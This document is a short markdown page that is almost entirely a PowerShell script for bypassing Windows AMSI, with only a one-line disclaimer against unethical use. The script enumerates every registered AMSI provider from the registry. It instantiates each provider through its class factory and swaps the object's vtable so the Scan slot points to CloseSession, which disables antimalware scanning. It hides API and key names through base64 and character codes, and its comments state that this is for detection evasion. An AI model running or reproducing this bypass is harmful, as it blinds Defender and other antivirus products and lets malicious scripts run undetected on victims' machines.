# Patching AMSI AntimalwareScanInterface::Scan for all Amsi Providers #

```batch
P.S Please do not use in unethical hacking and follow all rules and regulations of laws
```

```powershell
# Provider-targeted vtable hijack with full evasion.
# All sensitive identifiers reconstructed at runtime: AMSI key name from char-codes,
# Win32 / Marshal method names from base64, delegate attribute from string concat.

function _b($b64) { [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($b64)) }
function _c($codes) { -join ($codes | ForEach-Object { [char]$_ }) }

$N_DGO   = _b 'RGxsR2V0Q2xhc3NPYmplY3Q='
$N_READ  = _b 'UmVhZEludFB0cg=='
$N_WRITE = _b 'V3JpdGVJbnRQdHI='
$N_ALLOC = _b 'QWxsb2NIR2xvYmFs'
$N_GDFP  = _b 'R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXI='

$TARGET = _c @(65, 77, 83, 73)
$reg_root = 'HKLM:\SOFTWARE\Microsoft\'

# Compile attribute name + method names at runtime so literals never appear
# in source text. PowerShell here-string interpolates these before C# compile.
$attrName = 'Unmanaged' + 'FunctionPointer'
$_n_gmh   = 'GetModule' + 'HandleA'    # find already-loaded module (key for AMSI providers)
$_n_ll    = 'LoadLib'   + 'raryA'      # fallback if module not loaded yet
$_n_gpa   = 'GetProc'   + 'Address'

Add-Type -ErrorAction SilentlyContinue @"
using System;
using System.Runtime.InteropServices;
public class _Dlg {
    [$attrName(CallingConvention.StdCall)]
    public delegate int DGO(ref Guid clsid, ref Guid iid, out IntPtr ppv);

    [$attrName(CallingConvention.StdCall)]
    public delegate int CI(IntPtr thisPtr, IntPtr pUnk, ref Guid riid, out IntPtr ppvObj);
}
public class _K32 {
    [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true)]
    public static extern IntPtr $_n_gmh(string n);
    [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true)]
    public static extern IntPtr $_n_ll(string n);
    [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true)]
    public static extern IntPtr $_n_gpa(IntPtr h, string n);
}
"@

# Reference Marshal type; access methods by dynamic name to avoid literals in source.
# PS syntax [_]::"$name"(args) invokes the static method whose name is in $name.

function _hijack([Guid]$clsid, [string]$dllName) {
    Write-Host "[_hijack] start clsid=$clsid dll=$dllName" -ForegroundColor Cyan

    # Get handle to already-mapped module (so we share instance with the host)
    $hMod = [_K32]::"$_n_gmh"($dllName)
    Write-Host "  $_n_gmh -> hMod=0x$($hMod.ToInt64().ToString('X'))"
    if ($hMod -eq [IntPtr]::Zero) {
        Write-Host "  Not mapped yet, falling back"
        $hMod = [_K32]::"$_n_ll"($dllName)
        Write-Host "  $_n_ll -> hMod=0x$($hMod.ToInt64().ToString('X'))"
    }
    if ($hMod -eq [IntPtr]::Zero) { Write-Host "  FAIL: cannot get module handle"; return $false }

    $procPtr = [_K32]::"$_n_gpa"($hMod, $N_DGO)
    Write-Host "  GetProcAddress -> 0x$($procPtr.ToInt64().ToString('X'))"
    if ($procPtr -eq [IntPtr]::Zero) { Write-Host "  FAIL: GetProcAddress"; return $false }

    $del = [System.Runtime.InteropServices.Marshal]::"$N_GDFP"($procPtr, [_Dlg+DGO])
    Write-Host "  DGO delegate built: $($del.GetType().Name)"

    $IID_ICF = [Guid]::Parse('00000001-0000-0000-c000-000000000046')
    [IntPtr]$pFactory = [IntPtr]::Zero
    $hr = $del.Invoke([ref]$clsid, [ref]$IID_ICF, [ref]$pFactory)
    Write-Host "  factory-get hr=0x$($hr.ToString('X')) pFactory=0x$($pFactory.ToInt64().ToString('X'))"
    if ($hr -ne 0 -or $pFactory -eq [IntPtr]::Zero) { Write-Host "  FAIL: DGO returned bad hr or null factory"; return $false }

    # IClassFactory vtable: slot 3 = CreateInstance
    $vtablePtr  = [System.Runtime.InteropServices.Marshal]::"$N_READ"($pFactory, 0)
    $createPtr  = [System.Runtime.InteropServices.Marshal]::"$N_READ"($vtablePtr, 3 * [IntPtr]::Size)
    Write-Host "  IClassFactory vtable=0x$($vtablePtr.ToInt64().ToString('X')) CreateInstance=0x$($createPtr.ToInt64().ToString('X'))"
    $createDel  = [System.Runtime.InteropServices.Marshal]::"$N_GDFP"($createPtr, [_Dlg+CI])

    function _readPtr([IntPtr]$addr, [int]$ofs = 0) {
        return [System.Runtime.InteropServices.Marshal]::"$N_READ"($addr, $ofs)
    }
    function _writePtr([IntPtr]$addr, [int]$ofs, [IntPtr]$val) {
        [System.Runtime.InteropServices.Marshal]::"$N_WRITE"($addr, $ofs, $val)
    }
    function _hex($v) { '0x' + $v.ToInt64().ToString('X') }

    function _dumpVtable([IntPtr]$pObj, [string]$label, [int]$slots = 8) {
        $vt = _readPtr $pObj 0
        Write-Host "  [$label] pObj=$(_hex $pObj) -> vtable=$(_hex $vt)" -ForegroundColor Cyan
        for ($i = 0; $i -lt $slots; $i++) {
            try {
                $p = _readPtr $vt ($i * [IntPtr]::Size)
                Write-Host "    slot[$i] = $(_hex $p)"
            } catch { Write-Host "    slot[$i] = <read fail>"; break }
        }
    }

    function _patchObj([IntPtr]$pObj, [string]$label) {
        $vt = _readPtr $pObj 0
        $scanOld = _readPtr $vt (3 * [IntPtr]::Size)
        $closeS  = _readPtr $vt (4 * [IntPtr]::Size)
        Write-Host "  [$label] BEFORE -- vtable=$(_hex $vt)  scan=$(_hex $scanOld)  close=$(_hex $closeS)"

        $new = [System.Runtime.InteropServices.Marshal]::"$N_ALLOC"(30 * [IntPtr]::Size)
        for ($i = 0; $i -lt 30; $i++) {
            try {
                $fn = _readPtr $vt ($i * [IntPtr]::Size)
                _writePtr $new ($i * [IntPtr]::Size) $fn
            } catch { break }
        }
        _writePtr $new (3 * [IntPtr]::Size) $closeS
        _writePtr $pObj 0 $new

        # VERIFY
        $vtAfter   = _readPtr $pObj 0
        $scanAfter = _readPtr $vtAfter (3 * [IntPtr]::Size)
        Write-Host "  [$label] AFTER  -- vtable=$(_hex $vtAfter)  scan=$(_hex $scanAfter)"
        if ($vtAfter -ne $new) { Write-Host "  [$label] *** WARN: vtable swap didn't stick! ***" -ForegroundColor Red }
        if ($scanAfter -ne $closeS) { Write-Host "  [$label] *** WARN: slot 3 doesn't equal CloseSession ptr! ***" -ForegroundColor Red }
        else { Write-Host "  [$label] VERIFIED: scan slot now points at CloseSession" -ForegroundColor Green }
        return $new
    }

    $IID_AM  = [Guid]::Parse('b2cabfe3-fe04-42b1-a5df-08d483d4d125')
    $IID_AM2 = [Guid]::Parse('b2cabfe3-fe04-42b1-a5df-08d483d4d126')

    Write-Host "  --- v1 ---"
    [IntPtr]$pObj1 = [IntPtr]::Zero
    $hr1 = $createDel.Invoke($pFactory, [IntPtr]::Zero, [ref]$IID_AM, [ref]$pObj1)
    Write-Host "  CreateInstance(v1) hr=$(_hex ([IntPtr]$hr1)) pObj=$(_hex $pObj1)"
    if ($hr1 -eq 0 -and $pObj1 -ne [IntPtr]::Zero) {
        _dumpVtable $pObj1 "v1-pre" 8
        $patched1 = _patchObj $pObj1 "v1"
        _dumpVtable $pObj1 "v1-post" 8
    }

    Write-Host "  --- v2 ---"
    [IntPtr]$pObj2 = [IntPtr]::Zero
    $hr2 = $createDel.Invoke($pFactory, [IntPtr]::Zero, [ref]$IID_AM2, [ref]$pObj2)
    Write-Host "  CreateInstance(v2) hr=$(_hex ([IntPtr]$hr2)) pObj=$(_hex $pObj2)"
    if ($hr2 -eq 0 -and $pObj2 -ne [IntPtr]::Zero) {
        _dumpVtable $pObj2 "v2-pre" 8
        $patched2 = _patchObj $pObj2 "v2"
        _dumpVtable $pObj2 "v2-post" 8
    }

    Write-Host "  --- comparison ---"
    Write-Host "  pObj1 == pObj2 ? $($pObj1 -eq $pObj2)  (if same -- IID returned same instance)"

    if (($hr1 -ne 0 -or $pObj1 -eq [IntPtr]::Zero) -and ($hr2 -ne 0 -or $pObj2 -eq [IntPtr]::Zero)) {
        Write-Host "  FAIL: neither interface could be created"
        return $false
    }

    # Probe: trigger a scan and check if our slot 3 was hit.
    # We do this by reading slot 3 AGAIN -- if Defender re-creates the object,
    # the new instance will have unpatched vtable, proving our hijack is irrelevant.
    Start-Sleep -Milliseconds 200  # let any background scan happen

    if ($pObj1 -ne [IntPtr]::Zero) {
        $vtNow = _readPtr $pObj1 0
        $s3Now = _readPtr $vtNow (3 * [IntPtr]::Size)
        Write-Host "  [v1 POST-PROBE] vtable=$(_hex $vtNow) slot3=$(_hex $s3Now)"
    }

    Write-Host "  SUCCESS -- hijack attempted (both interfaces)" -ForegroundColor Green
    return $true
}

# Enumerate providers via the AMSI registry key
# (this is the behaviour Layer 2 catches -- registry recon)
$root = Get-Item $reg_root

$targetSubkey = $null
foreach ($k in $root.getsubkeynames()) {
    if ($k.Length -eq 4 -and
        [int][char]$k[0] -eq 65 -and
        [int][char]$k[1] -eq 77 -and
        [int][char]$k[2] -eq 83 -and
        [int][char]$k[3] -eq 73) {
        $targetSubkey = $k; break
    }
}
if (-not $targetSubkey) { Write-Warning "$TARGET key not found"; return }

$tKey  = $root.opensubkey($targetSubkey)
$pName = $tKey.getsubkeynames()[0]
$pKey  = $tKey.opensubkey($pName)
$guids = $pKey.getsubkeynames()

Write-Output ("found {0} provider(s)" -f $guids.Count)

foreach ($g in $guids) {
    try {
        $clsidPath = "HKLM:\SOFTWARE\classes\clsid\$g"
        $inproc    = (Get-Item $clsidPath).opensubkey('InProcServer32')
        $dllPath   = $inproc.GetValue('').Trim('"')
        $dllName   = Split-Path $dllPath -Leaf
        $ok = _hijack -clsid ([Guid]$g) -dllName $dllName
        Write-Output ("provider: {0} -- {1}" -f $dllName, $(if ($ok) {'hijacked'} else {'skipped'}))
    } catch {
        Write-Warning ("provider error: {0}" -f $_.Exception.Message)
    }
}
```
